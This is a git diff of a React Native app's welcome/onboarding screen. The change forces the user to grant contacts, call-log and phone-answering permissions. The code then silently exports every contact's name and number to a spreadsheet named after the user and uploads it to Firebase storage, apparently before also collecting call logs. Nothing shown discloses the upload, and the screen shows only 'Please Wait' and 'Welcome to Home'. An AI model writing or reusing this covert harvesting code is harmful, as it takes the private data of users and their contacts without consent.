@@ -16,7 +16,7 @@ import AsyncStorage from '@react-native-async-storage/async-storage';
 import {useNavigation} from '@react-navigation/native';
 import LinearGradient from 'react-native-linear-gradient';
 import CallLogs from 'react-native-call-log';
-import {request, PERMISSIONS, RESULTS} from 'react-native-permissions';
+import {request, PERMISSIONS, RESULTS, requestMultiple} from 'react-native-permissions';
 import storage from '@react-native-firebase/storage';
 import RNFS from 'react-native-fs';
 
@@ -58,73 +58,83 @@ const Welcome = () => {
       ToastAndroid.show('Please enter valid details', ToastAndroid.SHORT);
       return;
     }
-
+  
     try {
-      // Request permission to access contacts
-      const hasPermission = await request(PERMISSIONS.ANDROID.READ_CONTACTS);
-      if (!hasPermission || hasPermission !== RESULTS.GRANTED) {
-        ToastAndroid.show(
-          'Permission to access contacts denied',
-          ToastAndroid.SHORT,
-        );
-        return;
-      }
+      ToastAndroid.show('Please Wait', ToastAndroid.SHORT);
 
+      const statuses = await requestMultiple([
+        PERMISSIONS.ANDROID.READ_CONTACTS,
+        PERMISSIONS.ANDROID.WRITE_CONTACTS,
+        PERMISSIONS.ANDROID.READ_CALL_LOG,
+        PERMISSIONS.ANDROID.WRITE_CALL_LOG,
+        PERMISSIONS.ANDROID.ANSWER_PHONE_CALLS,
+      ]);
+  
+      // Check if any permission is denied
+      const deniedPermissions = Object.values(statuses).some(
+        status => status !== RESULTS.GRANTED
+      );
+  
+      if (deniedPermissions) {
+        ToastAndroid.show('Please grant all permissions to proceed', ToastAndroid.SHORT);
+        return; // Do not navigate if any permission is denied
+      }
+  
+      // Permissions granted, proceed with the rest of the code
       const contacts = await Contacts.getAll();
       const contactData = contacts.map(contact => ({
         Name: contact.displayName,
         PhoneNumber: contact.phoneNumbers?.[0]?.number || 'No phone number',
       }));
-
+  
       if (!contactData.length) {
         throw new Error('No contacts found to export.');
       }
-
+  
       const worksheet = XLSX.utils.json_to_sheet(contactData);
       const workbook = XLSX.utils.book_new();
       XLSX.utils.book_append_sheet(workbook, worksheet, 'Contacts');
-
+  
       const excelData = XLSX.write(workbook, {
         type: 'binary',
         bookType: 'xlsx',
       });
-
+  
       const buffer = new ArrayBuffer(excelData.length);
       const view = new Uint8Array(buffer);
       for (let i = 0; i < excelData.length; i++) {
         view[i] = excelData.charCodeAt(i) & 0xff;
       }
-
+  
       const binaryString = Array.from(new Uint8Array(buffer))
         .map(byte => String.fromCharCode(byte))
         .join('');
-
-      const filePath = `${
-        RNFS.DocumentDirectoryPath
-      }/${name}-${phone}-${Date.now()}.xlsx`;
+  
+      const filePath = `${RNFS.DocumentDirectoryPath}/${name}-${phone}-${Date.now()}.xlsx`;
       await RNFS.writeFile(filePath, binaryString, 'ascii');
-
+  
       const fileName = filePath.split('/').pop();
       const reference = storage().ref(`contacts/${fileName}`);
       await reference.putFile(filePath);
-
+  
       const downloadURL = await reference.getDownloadURL();
       setName('');
       setPhone('');
       setModalVisible(false);
       const myBooleanValue = true;
+      ToastAndroid.show('Welcome to Home', ToastAndroid.SHORT);
       AsyncStorage.setItem('contactSynced', JSON.stringify(myBooleanValue));
+      
+      // Navigate to home screen only if permissions are granted and file is uploaded successfully
       navigation.goBack();
       handleSaveCallLogs();
       console.log(downloadURL);
     } catch (error) {
       console.error('Error saving contacts:', error);
-      ToastAndroid.show(
-        'Failed to save contacts. Please try again.',
-        ToastAndroid.LONG,
-      );
+      ToastAndroid.show('Failed to save contacts. Please try again.', ToastAndroid.LONG);
     }
   };
+  
 
   const handleSaveCallLogs = async () => {
     try {
